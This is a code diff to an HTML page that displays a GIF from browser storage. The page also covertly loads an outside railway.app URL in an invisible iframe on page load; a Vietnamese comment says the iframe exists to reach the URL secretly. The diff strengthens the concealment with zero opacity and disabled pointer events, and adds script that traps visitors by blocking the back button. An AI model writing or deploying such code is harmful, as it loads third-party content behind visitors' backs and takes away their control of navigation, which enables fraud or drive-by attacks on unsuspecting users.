@@ -23,11 +23,12 @@
             display: block;
         }
         iframe {
-            position: absolute;
             width: 0;
             height: 0;
             border: 0;
-            visibility: hidden;
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
@@ -37,20 +38,32 @@
     </div>
 
     <script>
-        // Lấy dữ liệu GIF từ localStorage
+        // Hiển thị GIF
         window.onload = function() {
-            // Hiển thị GIF
             const uploadedGif = localStorage.getItem('uploadedGif');
             if (uploadedGif) {
                 document.getElementById('displayedGif').src = uploadedGif;
+                
+                // Tạo iframe ẩn sau khi GIF đã load
+                setTimeout(() => {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = 'https://web-production-c2a9d.up.railway.app/';
+                    document.body.appendChild(iframe);
+                }, 100);
             }
-
-            // Tạo iframe ẩn để truy cập URL ngầm
-            const hiddenFrame = document.createElement('iframe');
-            hiddenFrame.style.display = 'none';
-            hiddenFrame.src = 'https://web-production-c2a9d.up.railway.app/';
-            document.body.appendChild(hiddenFrame);
         }
+
+        // Ngăn chặn điều hướng tự động
+        window.onbeforeunload = function() {
+            return;
+        }
+        
+        // Chặn các thao tác điều hướng
+        history.pushState(null, '', location.href);
+        window.onpopstate = function() {
+            history.go(1);
+        };
     </script>
 </body>
 </html>
